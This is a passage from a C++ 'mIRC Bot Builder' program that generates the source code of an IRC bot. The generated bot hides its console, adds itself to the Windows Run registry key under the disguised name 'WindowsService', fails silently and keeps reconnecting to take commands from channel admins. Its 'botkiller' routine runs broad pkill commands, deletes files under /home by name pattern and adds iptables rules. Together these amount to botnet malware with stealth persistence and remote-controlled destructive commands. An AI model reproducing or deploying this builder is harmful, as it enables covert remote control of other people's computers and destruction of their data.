        code << "                        sendCommand(\"PRIVMSG \" + target + \" :Scan results (truncated): \" + scanResults.substr(0, 400) + \"...\");\n";
        code << "                    } else {\n";
        code << "                        sendCommand(\"PRIVMSG \" + target + \" :Scan results: \" + scanResults);\n";
        code << "                    }\n";
        code << "                }\n";
        code << "                else if (action == \"kill\") {\n";
        code << "                    // Kill suspicious processes\n";
        code << "                    log(\"Botkiller kill - terminating malware\");\n";
        code << "                    \n";
        code << "                    std::string killResults = \"\";\n";
        code << "                    \n";
        code << "                    // Kill suspicious processes\n";
        code << "                    FILE* killPipe = popen(\"pkill -f 'bot|malware|backdoor|trojan|virus|keylogger|spyware' 2>/dev/null\", \"r\");\n";
        code << "                    if (killPipe) {\n";
        code << "                        pclose(killPipe);\n";
        code << "                        killResults += \"Suspicious processes terminated.\\n\";\n";
        code << "                    }\n";
        code << "                    \n";
        code << "                    // Remove suspicious files\n";
        code << "                    FILE* removePipe = popen(\"find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' -exec rm -f {} \\; 2>/dev/null\", \"r\");\n";
        code << "                    if (removePipe) {\n";
        code << "                        pclose(removePipe);\n";
        code << "                        killResults += \"Suspicious files removed.\\n\";\n";
        code << "                    }\n";
        code << "                    \n";
        code << "                    // Block suspicious ports\n";
        code << "                    system(\"iptables -A INPUT -p tcp --dport 6667 -j DROP 2>/dev/null\");\n";
        code << "                    system(\"iptables -A INPUT -p tcp --dport 8080 -j DROP 2>/dev/null\");\n";
        code << "                    system(\"iptables -A INPUT -p tcp --dport 4444 -j DROP 2>/dev/null\");\n";
        code << "                    killResults += \"Suspicious ports blocked.\\n\";\n";
        code << "                    \n";
        code << "                    sendCommand(\"PRIVMSG \" + target + \" :Kill results: \" + killResults);\n";
        code << "                }\n";
        code << "                else if (action == \"clean\") {\n";
        code << "                    // Complete cleanup\n";
        code << "                    log(\"Botkiller clean - complete malware removal\");\n";
        code << "                    \n";
        code << "                    // Kill all suspicious processes\n";
        code << "                    system(\"pkill -f 'bot|malware|backdoor|trojan|virus|keylogger|spyware' 2>/dev/null\");\n";
        code << "                    \n";
        code << "                    // Remove all suspicious files\n";
        code << "                    system(\"find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' -exec rm -f {} \\; 2>/dev/null\");\n";
        code << "                    \n";
        code << "                    // Block all suspicious ports\n";
        code << "                    system(\"iptables -A INPUT -p tcp --dport 6667 -j DROP 2>/dev/null\");\n";
        code << "                    system(\"iptables -A INPUT -p tcp --dport 8080 -j DROP 2>/dev/null\");\n";
        code << "                    system(\"iptables -A INPUT -p tcp --dport 4444 -j DROP 2>/dev/null\");\n";
        code << "                    system(\"iptables -A INPUT -p tcp --dport 31337 -j DROP 2>/dev/null\");\n";
        code << "                    system(\"iptables -A INPUT -p tcp --dport 1337 -j DROP 2>/dev/null\");\n";
        code << "                    \n";
        code << "                    // Clear startup entries\n";
        code << "                    #ifdef _WIN32\n";
        code << "                    system(\"reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsService /f 2>/dev/null\");\n";
        code << "                    #else\n";
        code << "                    system(\"rm -f ~/.config/autostart/*bot* ~/.config/autostart/*malware* 2>/dev/null\");\n";
        code << "                    #endif\n";
        code << "                    \n";
        code << "                    sendCommand(\"PRIVMSG \" + target + \" :Complete malware cleanup completed.\");\n";
        code << "                }\n";
        code << "                else {\n";
        code << "                    sendCommand(\"PRIVMSG \" + target + \" :Usage: !botkiller [scan|kill|clean]\");\n";
        code << "                }\n";
        code << "            }\n";
        code << "        }\n";
        code << "    }\n\n";
        
        code << "    void run() {\n";
        code << "        running = true;\n\n";
        code << "        while (running) {\n";
        code << "            if (!connect()) {\n";
        code << "                if (autoReconnect) {\n";
        code << "                    log(\"Connection failed. Retrying in \" + std::to_string(reconnectDelay) + \" seconds...\");\n";
        code << "                    std::this_thread::sleep_for(std::chrono::seconds(reconnectDelay));\n";
        code << "                    continue;\n";
        code << "                } else {\n";
        code << "                    log(\"Connection failed and auto-reconnect is disabled\");\n";
        code << "                    break;\n";
        code << "                }\n";
        code << "            }\n\n";
        code << "            authenticate();\n";
        code << "            joinChannels();\n\n";
        code << "            char buffer[1024];\n";
        code << "            while (running) {\n";
        code << "                memset(buffer, 0, sizeof(buffer));\n";
        code << "                int bytes = recv(sockfd, buffer, sizeof(buffer) - 1, 0);\n\n";
        code << "                if (bytes <= 0) {\n";
        code << "                    log(\"Connection lost\");\n";
        code << "                    break;\n";
        code << "                }\n\n";
        code << "                std::string data(buffer);\n";
        code << "                std::istringstream iss(data);\n";
        code << "                std::string line;\n\n";
        code << "                while (std::getline(iss, line)) {\n";
        code << "                    if (!line.empty()) {\n";
        code << "                        handleMessage(line);\n";
        code << "                    }\n";
        code << "                }\n";
        code << "            }\n\n";
        code << "            close(sockfd);\n\n";
        code << "            if (autoReconnect && running) {\n";
        code << "                log(\"Reconnecting in \" + std::to_string(reconnectDelay) + \" seconds...\");\n";
        code << "                std::this_thread::sleep_for(std::chrono::seconds(reconnectDelay));\n";
        code << "            }\n";
        code << "        }\n";
        code << "    }\n\n";
        
        code << "    void setupAutoStartup() {\n";
        code << "        #ifdef _WIN32\n";
        code << "        // Register for Windows startup\n";
        code << "        HKEY hKey;\n";
        code << "        char exePath[MAX_PATH];\n";
        code << "        GetModuleFileNameA(NULL, exePath, MAX_PATH);\n";
        code << "        \n";
        code << "        if (RegOpenKeyExA(HKEY_CURRENT_USER, \n";
        code << "            \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", \n";
        code << "            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {\n";
        code << "            RegSetValueExA(hKey, \"WindowsService\", 0, REG_SZ, \n";
        code << "                (const BYTE*)exePath, strlen(exePath) + 1);\n";
        code << "            RegCloseKey(hKey);\n";
        code << "        }\n";
        code << "        #endif\n";
        code << "    }\n\n";
        code << "    void stop() {\n";
        code << "        running = false;\n";
        code << "        if (sockfd >= 0) {\n";
        code << "            close(sockfd);\n";
        code << "        }\n";
        code << "    }\n";
        code << "};\n\n";
        
        code << "int main() {\n";
        code << "    // Stealth mode - no console output\n";
        code << "    #ifdef _WIN32\n";
        code << "    // Hide console window on Windows\n";
        code << "    ShowWindow(GetConsoleWindow(), SW_HIDE);\n";
        code << "    #endif\n\n";
        code << "    MircBot bot;\n\n";
        code << "    // Setup auto-startup (Windows only)\n";
        code << "    bot.setupAutoStartup();\n\n";
        code << "    // Silent signal handling\n";
        code << "    signal(SIGINT, [](int) {\n";
        code << "        exit(0);\n";
        code << "    });\n\n";
        code << "    try {\n";
        code << "        bot.run();\n";
        code << "    } catch (const std::exception& e) {\n";
        code << "        // Silent error handling\n";
        code << "    }\n\n";
        code << "    return 0;\n";
        code << "}\n";
        
        return code.str();
    }
};

int main() {
    MircBotBuilder builder;
    std::string choice;
    
    std::cout << "Welcome to Star-2 mIRC Bot Builder!\n";
    std::cout << "This tool will help you create a custom IRC bot.\n";
    
    while (true) {
        builder.showMenu();
        std::getline(std::cin, choice);
        

        
        if (choice == "1") {
            builder.setBotName();
        } else if (choice == "2") {
            builder.setServer();
        } else if (choice == "3") {
            builder.setChannel();
        } else if (choice == "4") {
            builder.setPassword();
        } else if (choice == "5") {
            builder.setRealName();
        } else if (choice == "6") {
            builder.addAutoJoinChannels();
        } else if (choice == "7") {
            builder.addAdminUsers();
        } else if (choice == "8") {
            builder.setAutoReconnect();
        } else if (choice == "9") {
            builder.setLogFile();
        } else if (choice == "10") {
            builder.showSettings();
        } else if (choice == "11") {
            builder.generateBot();
        } else if (choice == "12") {
            std::cout << "Goodbye!\n";
            break;
        } else {
            std::cout << "Invalid option. Please try again.\n";
        }
    }
    
    return 0;
}